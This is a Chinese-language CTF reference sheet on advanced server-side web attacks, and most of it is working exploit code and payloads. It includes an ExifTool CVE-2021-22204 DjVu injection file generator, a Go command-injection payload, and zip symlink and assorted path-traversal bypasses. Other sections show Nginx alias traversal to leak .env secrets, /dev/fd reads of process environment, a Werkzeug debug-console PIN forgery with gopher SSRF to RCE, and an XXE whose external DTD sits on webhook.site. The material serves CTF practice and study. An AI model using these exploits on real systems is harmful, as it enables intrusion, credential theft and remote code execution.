# CTF Web - 进阶服务端技巧

## 目录
- [ExifTool CVE-2021-22204 —— DjVu Perl 注入（0xFun 2026）](#exiftool-cve-2021-22204--djvu-perl-注入0xfun-2026)
- [Go rune/字节长度不匹配 + 命令注入（VuwCTF 2025）](#go-rune字节长度不匹配--命令注入vuwctf-2025)
- [Zip 符号链接路径穿越（UTCTF 2024）](#zip-符号链接路径穿越utctf-2024)
- [路径穿越绕过技巧](#路径穿越绕过技巧)
  - [花括号剥离](#花括号剥离)
  - [双重 URL 编码](#双重-url-编码)
  - [Python os.path.join](#python-ospathjoin)
- [Nginx alias 穿越读取 .env（VolgaCTF 2018）](#nginx-alias-穿越读取-envvolgactf-2018)
- [/dev/fd 符号链接绕过 /proc 过滤（Google CTF 2017）](#devfd-符号链接绕过-proc-过滤google-ctf-2017)
- [Unicode 同形点路径穿越 U+2E2E（CSAW 2017）](#unicode-同形点路径穿越-u2e2ecsaw-2017)
- [Ruby Regexp.escape 多字节字符绕过（Square CTF 2017）](#ruby-regexpescape-多字节字符绕过square-ctf-2017)
- [Flask/Werkzeug 调试模式利用](#flaskwerkzeug-调试模式利用)
- [可绕过过滤器的外部 DTD XXE](#可绕过过滤器的外部-dtd-xxe)
- [路径穿越：URL 编码斜杠绕过](#路径穿越url-编码斜杠绕过)

另见：[server-side-advanced-2.md](server-side-advanced-2.md) 第二部分（SSRF 打 Docker、Castor XML、Apache ErrorDocument、SQLite 路径穿越、HQL 不间断空格、base64 路径穿越、8.3 短文件名绕过、parse_url @ 绕过、PHP zip:// LFI、XSS 转 SSTI、INSERT 列偏移、session cookie 伪造）。另见：[server-side-advanced-3.md](server-side-advanced-3.md) 第三部分（WAV 多语言、多斜杠 URL 绕过、Xalan math:random、SoapClient CRLF、gopher 无主机、SSRF 凭据泄露）。另见：[server-side-advanced-4.md](server-side-advanced-4.md) 第四部分（WeasyPrint SSRF、MongoDB 正则注入、Pongo2 SSTI、ZIP PHP webshell、basename() 绕过、wget CRLF SMTP、Gopher→MySQL SQLi、React Server Components RCE、AMQP/TLS sslsplit、CairoSVG XXE、Bazaar 仓库重建）。

---

<a id="exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026"></a>
## ExifTool CVE-2021-22204 —— DjVu Perl 注入（0xFun 2026）

**影响版本：** ExifTool ≤ 12.23

**漏洞：** DjVu 的 ANTa 注解块会用 Perl `eval` 解析。

**构造最小 DjVu 利用文件：**
```python
import struct

def make_djvu_exploit(command):
    # ANTa chunk with Perl injection
    ant_data = f'(metadata "\\c${{{command}}}")'.encode()

    # INFO chunk (1x1 image)
    info = struct.pack('>HHBBii', 1, 1, 24, 0, 300, 300)

    # Build DJVU FORM
    djvu_body = b'DJVU'
    djvu_body += b'INFO' + struct.pack('>I', len(info)) + info
    if len(info) % 2: djvu_body += b'\x00'
    djvu_body += b'ANTa' + struct.pack('>I', len(ant_data)) + ant_data
    if len(ant_data) % 2: djvu_body += b'\x00'

    # FORM header
    # AT&T = optional 4-byte prefix; FORM = IFF chunk type (separate fields)
    djvu = b'AT&T' + b'FORM' + struct.pack('>I', len(djvu_body)) + djvu_body
    return djvu

exploit = make_djvu_exploit("system('cat /flag.txt')")
with open('exploit.djvu', 'wb') as f:
    f.write(exploit)
```

**检测：** 查看 ExifTool 版本。DjVu 格式是经典载体。把构造好的 DjVu 上传到任何用 ExifTool 处理图片的端点。

---

<a id="go-runebyte-length-mismatch--command-injection-vuwctf-2025"></a>
## Go rune/字节长度不匹配 + 命令注入（VuwCTF 2025）

**模式（Go Go Cyber Ranger）：** Go 校验 `len([]rune(input)) > 32`，但拷贝的是 `len([]byte(input))` 个字节。

**关键点：** 多字节 UTF-8 字符（emoji 占 4 字节）在 rune 计数里算 1，在字节计数里算 4 → 溢出。

**利用：** 8 个 emoji（32 字节、8 个 rune）+ `";cmd\n"` = 共 40 字节，通过 32 rune 检查，却溢出到相邻缓冲区。

```bash
# If flag check uses: exec.Command("/bin/sh", "-c", fmt.Sprintf("test \"%s\" = \"%s\"", flag, input))
# Inject: ";od f*\n"
payload='🔥🔥🔥🔥🔥🔥🔥🔥";od f*\n'
curl -X POST http://target/check -d "secret=$payload"
```

**检测：** 存在对 `[]rune` 做长度校验、随后做字节级操作（拷贝、写缓冲区）的 Go Web 应用。在 Go 里始终检查 rune/字节不匹配。

---

<a id="zip-symlink-path-traversal-utctf-2024"></a>
## Zip 符号链接路径穿越（UTCTF 2024）

**模式（Schrödinger）：** 服务端解压上传的 ZIP 时不检查符号链接。

```bash
# Create symlink to target file, zip with -y to preserve
ln -s /path/to/flag.txt file.txt
zip -y exploit.zip file.txt
# Upload → server follows symlink → exposes file content
```

**检测：** 任何"上传 + 解压"端点。`zip -y` 会保留符号链接。许多解压工具默认跟随符号链接。

---

<a id="path-traversal-bypass-techniques"></a>
## 路径穿越绕过技巧

<a id="brace-stripping"></a>
### 花括号剥离
`{.}{.}/flag.txt` 在处理后变成 `../flag.txt`

<a id="double-url-encoding"></a>
### 双重 URL 编码
`%252E%252E%252F` 经两次解码后变成 `../`

<a id="python-ospathjoin"></a>
### Python os.path.join
`os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd`（绝对路径会忽略前缀）

---

<a id="nginx-alias-traversal-to-leak-env-volgactf-2018"></a>
### Nginx alias 穿越读取 .env（VolgaCTF 2018）

**模式：** 当 `location` 块的路径不以 `/` 结尾、而 `alias` 以 `/` 结尾时，Nginx 的 `alias` 配置错误会导致路径穿越。路径剩余部分被不安全地拼接，从而可用 `..` 穿越出别名目录。

```nginx
# Vulnerable Nginx configuration:
location /laravel {
    alias /var/www/html/public/;
}
# Note: /laravel has NO trailing slash, but alias has one
# This creates a join mismatch: /laravel<anything> maps to /var/www/html/public/<anything>
```

```bash
# Exploit: traverse out of the public/ directory to read .env
GET /laravel../.env HTTP/1.1
# Nginx resolves: alias "/var/www/html/public/" + "../.env" = /var/www/html/.env

# Read application source
GET /laravel../app/Http/Controllers/AuthController.php HTTP/1.1

# Read other config files
GET /laravel../config/database.php HTTP/1.1
GET /laravel../storage/logs/laravel.log HTTP/1.1
```

```python
import requests

target = "http://target"

# Leak Laravel .env file (contains APP_KEY, DB credentials, etc.)
r = requests.get(f"{target}/laravel../.env")
if r.status_code == 200:
    print("[+] .env contents:")
    print(r.text)
    # Look for APP_KEY, DB_PASSWORD, API keys, etc.
```

**检测清单：**
```text
# Test for the misconfiguration on common paths:
/static../
/assets../
/public../
/media../
/uploads../
/laravel../
# Any location block using alias without matching trailing slashes
```

**关键点：** 当 Nginx 的 `location` 指令缺少结尾斜杠、其 `alias` 却有一个时，路径会被不安全地拼接，允许 `..` 穿越出别名目录。这在 Laravel 部署中把 `/laravel` 映射到 `public/` 目录时很常见。始终检查 `location` 与 `alias` 的结尾斜杠是否匹配。

---

<a id="unicode-homoglyph-path-traversal-u2e2e-csaw-2017"></a>
## Unicode 同形点路径穿越 U+2E2E（CSAW 2017）

**模式：** U+2E2E（REVERSED QUESTION MARK，UTF-8：`E2 B8 AE`）在某些 Python HTTP 后端与 Unicode 规范化层里会被归一点（U+002E，0x2E）。发送 `%E2%B8%AE%E2%B8%AE/flag.txt` 可绕过 ASCII 点检查（`..` 被拦），而解析后的路径变成 `../flag.txt`。

```bash
# Standard path traversal blocked by ASCII dot check:
curl "http://target/files/../../flag.txt"   # blocked: contains ".."

# U+2E2E homoglyph bypass:
curl "http://target/files/%E2%B8%AE%E2%B8%AE/flag.txt"
# Backend normalizes E2B8AE → 0x2E (period), resolves as ../flag.txt
```

```python
import requests

# U+2E2E = REVERSED QUESTION MARK (⸮), UTF-8: 0xE2 0xB8 0xAE
# Normalizes to FULL STOP (.) in NFKC/NFC after some transformations

homoglyph_dot = '\u2E2E'
payload = f"{homoglyph_dot}{homoglyph_dot}/flag.txt"

r = requests.get(f"http://target/files/{payload}")
# If backend normalizes Unicode before filesystem access but after validation:
print(r.text)
```

**其他可尝试的 Unicode 点同形字符：**
```text
U+2E2E  ⸮  REVERSED QUESTION MARK  (E2 B8 AE) → .
U+FF0E  ．  FULLWIDTH FULL STOP     (EF BC 8E) → .
U+2024  ․  ONE DOT LEADER          (E2 80 A4) → .
U+FE52  ﹒  SMALL FULL STOP        (EF B9 92) → .
```

**关键点：** 校验层与执行层之间的 Unicode 归一化不一致，使得非 ASCII 点同形字符可以实施路径穿越。U+2E2E 是比全角技巧（U+FF0E）更冷门的替代。测试 NFKC 与 NFC 两种规范化形式 —— Python 的 `unicodedata.normalize('NFKC', char)` 能看出每个字符会折叠成什么。

---

<a id="ruby-regexpescape-multibyte-character-bypass-square-ctf-2017"></a>
## Ruby Regexp.escape 多字节字符绕过（Square CTF 2017）

**模式：** Ruby 的 `Regexp.escape` 按字节操作。`%bf` 字节后跟 `%5c`（反斜杠）构成一个合法的 GBK/Big5 多字节字符，把反斜杠吞掉，于是后续字符未转义，破坏了原本的正则转义。

```ruby
# Regexp.escape escapes special chars by prepending backslash
# e.g., Regexp.escape("a.b") → "a\\.b"

# Vulnerability: byte 0xBF followed by 0x5C (backslash) is a valid GBK character
# Regexp.escape sees 0xBF → not a special char, passes through
# Then sees 0x5C → escapes it to 0x5C 0x5C (double backslash)
# But in GBK: 0xBF 0x5C is ONE character (the lead byte absorbs the backslash)
# So the "escape" produces: 0xBF 0x5C 0x5C = GBK_char + 0x5C
# The second backslash then escapes the NEXT character, not the intended one

# Result: subsequent input characters become unescaped in the regex
```

```python
# In a CTF context: HTTP request with GBK lead byte in parameter
import requests

# %bf%5c in URL-encoded form — in GBK this is one character
# When Ruby calls Regexp.escape on the input, the backslash is consumed
payload = "\xbf\x5c" + ".*"   # GBK char eats the backslash; .* is now unescaped in regex

r = requests.get("http://target/search", params={"q": payload})
# If backend uses: /#{Regexp.escape(params[:q])}/  as a regex pattern
# The .* passes through unescaped, matching any string
```

**利用场景：**
```ruby
# Vulnerable code:
pattern = /#{Regexp.escape(user_input)}/
if flag.match(pattern)
  puts "Match!"
end

# Inject: "\xbf\x5c.*" → Regexp.escape produces "\xbf\\\\..*"
# In GBK context: first two bytes are one char, leaving ".*" unescaped
# Pattern becomes: /\xbf\\.*/ which in GBK matches the flag (greedy .*)
```

**关键点：** 字节级转义函数易受多字节字符注入影响。GBK/Big5 的前导字节（0xBF）后接 0x5C 构成单个合法字符，把 `Regexp.escape` 刚加上的反斜杠吃掉，导致后续字符未转义。检查 Ruby 正则校验中对非 ASCII 输入的处理，尤其当应用支持中日韩字符集时。

---

<a id="devfd-symlink-to-bypass-proc-filter-google-ctf-2017"></a>
## /dev/fd 符号链接绕过 /proc 过滤（Google CTF 2017）

**模式：** 应用在文件读取参数里过滤 `/proc` 以防止读取进程信息时，`/dev/fd` 提供了替代路径 —— 在 Linux 上它是指向 `/proc/self/fd` 的符号链接。

```bash
# Bypass /proc filter to read environment variables
curl "http://target/?f=/dev/fd/../environ"
# /dev/fd -> /proc/self/fd, then ../ traverses to /proc/self/

# Read command line
curl "http://target/?f=/dev/fd/../cmdline"

# Read memory maps
curl "http://target/?f=/dev/fd/../maps"

# Read specific file descriptor contents
curl "http://target/?f=/dev/fd/0"   # stdin
curl "http://target/?f=/dev/fd/1"   # stdout
curl "http://target/?f=/dev/fd/3"   # often a database or config file
```

**其他绕过 /proc 过滤的路径：**
```text
/dev/fd/../environ         # → /proc/self/environ
/dev/fd/../cmdline         # → /proc/self/cmdline
/dev/fd/../maps            # → /proc/self/maps
/dev/fd/../status          # → /proc/self/status
/dev/fd/../cwd/app.py      # → /proc/self/cwd/app.py (working dir)
/dev/stdin/../environ      # /dev/stdin → /proc/self/fd/0, then ../
```

**关键点：** Linux 上 `/dev/fd` 是指向 `/proc/self/fd` 的符号链接。用 `../` 向上遍历即可到达 `/proc/self/`，绕过对字面串 `/proc` 的黑名单检查。同理 `/dev/stdin`、`/dev/stdout`、`/dev/stderr` 都链接进 `/proc/self/fd/`，可作穿越支点。`/proc` 被拉黑时务必试这些替代路径。

---

<a id="flaskwerkzeug-debug-mode-exploitation"></a>
## Flask/Werkzeug 调试模式利用

**模式（Meowy, Nullcon 2026）：** 启用 Werkzeug 调试器 + session 密钥弱的 Flask 应用。

**攻击链：**
1. **爆破 session 密钥：** 当密钥由弱随机源生成时（如 `random_word` 库、短字符串）：
   ```bash
   flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
   # Or brute-force programmatically:
   for word in wordlist:
       try:
           data = decode_flask_cookie(cookie, word)
           print(f"Secret: {word}, Data: {data}")
       except: pass
   ```
2. **伪造 admin session：** 拿到密钥后，伪造 `is_admin=True`：
   ```bash
   flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
   ```
3. **经 pycurl 的 SSRF：** 若 `/fetch` 端点使用 pycurl，目标打 `http://127.0.0.1/admin/flag`
4. **头部绕过：** 某些端点会检查 `X-Fetcher` 之类的自定义头 —— 在 SSRF 请求里带上

**Werkzeug 调试器 RCE：** 若 `/console` 可访问：
1. **经 SSRF 读取系统标识：** `/etc/machine-id`、`/sys/class/net/eth0/address`
2. **获取 console SECRET：** 拉取 `/console` 页面，从 HTML 中提取 `SECRET = "..."`
3. **计算 PIN cookie：**
   ```python
   import hashlib
   h = hashlib.sha1()
   for bit in (username, "flask.app", "Flask", modfile, str(node), machine_id):
       h.update(bit.encode() if isinstance(bit, str) else bit)
   h.update(b"cookiesalt")
   cookie_name = "__wzd" + h.hexdigest()[:20]
   h.update(b"pinsalt")
   num = f"{int(h.hexdigest(), 16):09d}"[:9]
   pin = "-".join([num[:3], num[3:6], num[6:]])
   pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
   ```
4. **经 gopher SSRF 执行：** 直接访问被拦时，用 gopher 发送带 PIN cookie 的 HTTP 请求：
   ```python
   cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
   req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
   gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
   # SSRF to gopher_url
   ```

**关键点：** 即便 Werkzeug console 只能从 localhost 访问，SSRF + gopher 协议组合也能完整绕过 PIN 并 RCE。PIN 信任 cookie 无需真正输入 PIN 就能通过会话认证。

---

<a id="xxe-with-external-dtd-filter-bypass"></a>
## 可绕过过滤器的外部 DTD XXE

**模式（PDFile, PascalCTF 2026）：** 上传端点会过滤 XML 中的关键字（"file"、"flag"、"etc"），但经 HTTP 拉取的外部 DTD 不受过滤。

**技巧：** 把恶意 DTD 托管在 webhook.site 或攻击者服务器上：
```xml
<!-- Remote DTD (hosted on webhook.site) -->
<!ENTITY % data SYSTEM "file:///app/flag.txt">
<!ENTITY leak "%data;">
```

```xml
<!-- Uploaded XML (clean, passes filter) -->
<?xml version="1.0"?>
<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
<book><title>&leak;</title></book>
```

**关键点：** XML 解析器会拉取并处理外部 DTD，而不施加对上传内容的关键字过滤。响应里被解析的字段就会带上 flag。

**用 webhook.site API 搭建：**
```python
import requests
TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
             json={"default_content": dtd, "default_content_type": "text/xml"})
```

---

<a id="path-traversal-url-encoded-slash-bypass"></a>
## 路径穿越：URL 编码斜杠绕过

**`%2f` 绕过：** Nginx 路由匹配不解码 `%2f`，但文件系统会解码：
```bash
curl 'https://target/public%2f../nginx.conf'
# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
# Filesystem resolves to /public/../nginx.conf → /nginx.conf
```
**还可尝试：** 点用 `%2e`、双重编码 `%252f`、Windows 上的反斜杠 `\`。

---

WeasyPrint SSRF、MongoDB 正则注入、Pongo2 SSTI、ZIP PHP webshell、basename() 绕过、wget CRLF SMTP、Gopher→MySQL SQLi、React Server Components RCE、AMQP/TLS 截获、CairoSVG XXE、Bazaar 仓库重建见 [server-side-advanced-4.md](server-side-advanced-4.md)。
